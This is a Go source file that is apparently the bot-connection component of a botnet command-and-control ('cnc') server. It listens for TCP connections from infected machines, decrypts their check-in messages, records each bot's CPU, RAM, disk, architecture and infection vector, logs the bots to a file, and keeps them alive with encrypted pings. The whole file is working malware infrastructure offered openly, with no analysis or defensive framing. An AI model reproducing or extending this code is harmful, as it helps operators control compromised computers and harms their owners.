package socket

import (
	//"cnc/lib/grafana"
	"cnc/lib/security"
	"cnc/lib/utils"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

func (b *Bot) HandleConnection() {
	defer func() {
		_ = b.Network.Socket.Close()
		b.Remove()

		// don't print no auth sockets..
		if b.Auth {
			utils.Log(fmt.Sprintf("[-] [%d] [LEAVED] [SOCK: %s] [CPU: %d] [RAM: %d] [DISK: %d] [ARCH: %s] [VERSION: %s]", len(BotList), b.Network.Socket.RemoteAddr(), b.Cpu, b.Mem, b.Disk, b.Arch, b.Version))
			//grafana.BotCount.WithLabelValues(b.Arch, b.Vector).Add(-1)

			//cpu := strconv.Itoa(b.Cpu)
			//grafana.CpuCount.WithLabelValues(cpu).Add(-1)
		}
	}()

	for _, v := range BotList {
		if strings.Split(v.Network.Socket.RemoteAddr().String(), ":")[0] == strings.Split(b.Network.Socket.RemoteAddr().String(), ":")[0] {
			b.Network.Connected = false
		}
	}

	if !b.Network.Connected {
		return
	}

	BotList = append(BotList, b)

	for b.Network.Connected {
		success, data := b.Network.Input()
		data = security.DecryptStr(data)

		// fail        whitespace     nil           not a command from bot [todo: ban ip]
		if !success || data == " " || data == "" || !strings.Contains(data, "|") {
			continue
		}

		args := strings.Split(data, "|")

		if len(args) <= 1 {
			continue
		}

		switch args[0] {
		// [BOTINFO|CPU|RAM|DISK|ARCH|VERSION|VECTOR]
		//  0       1   2   3    4    5       6
		// -----------------------------------
		// This function is used as "login", if the socket never return bot info, this was probably socket created by somes other shit
		// if auth fail, just close the socket
		case "BOTINFO":
			cpu, err := strconv.Atoi(args[1])
			if utils.HandleError(err) {
				b.Network.Connected = false
				continue
			}

			mem, err := strconv.Atoi(args[2])
			if utils.HandleError(err) {
				b.Network.Connected = false
				continue
			}

			dsk, err := strconv.Atoi(args[3])
			if utils.HandleError(err) {
				b.Network.Connected = false
				continue
			}

			b.Cpu, b.Mem, b.Disk, b.Arch, b.Version, b.Vector = cpu, mem, dsk, args[4], args[5], args[6]
			Info := fmt.Sprintf("[+] [%d] [JOINED] [SOCK: %s] [CPU: %d] [RAM: %d] [DISK: %d] [ARCH: %s] [VERSION: %s] [VECTOR: %s]", len(BotList), b.Network.Socket.RemoteAddr(), b.Cpu, b.Mem, b.Disk, b.Arch, b.Version, b.Vector)

			//grafana.CpuCount.WithLabelValues(cpu).Add(1)
			//grafana.BotCount.WithLabelValues(b.Arch, b.Vector).Add(1)

			utils.Debug(Info)
			utils.AppendLine("data/bots.txt", Info)
			b.Auth = true
		default:
			fmt.Printf("[%v]\n", data)
		}
	}
}

func (b *Bot) TaskPing() {
	for b.Network.Connected {
		if b.Auth {
			if !b.Network.Send(security.EncryptStr("PING")) {
				b.Network.Connected = false
			}
		}

		time.Sleep(30 * time.Second)
	}
}

func (b *Bot) Remove() {
	for i, v := range BotList {
		if v == b {
			BotList = append(BotList[:i], BotList[i+1:]...)
		}
	}
}

func StartBotServer() {
	socket, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", utils.BotSocketPort))
	utils.HandleError(err)

	utils.Log(fmt.Sprintf("[*] [BOT] Server open on port %d", utils.BotSocketPort))

	for {
		conn, err := socket.Accept()
		utils.HandleError(err)

		b := Bot{
			Cpu:     0,
			Mem:     0,
			Disk:    0,
			Arch:    "nan",
			Version: "nan",
			Auth:    false,
			Network: &Socket{
				Connected: true,
				Socket:    conn,
			},
		}

		go b.TaskPing()
		go b.HandleConnection()
	}
}
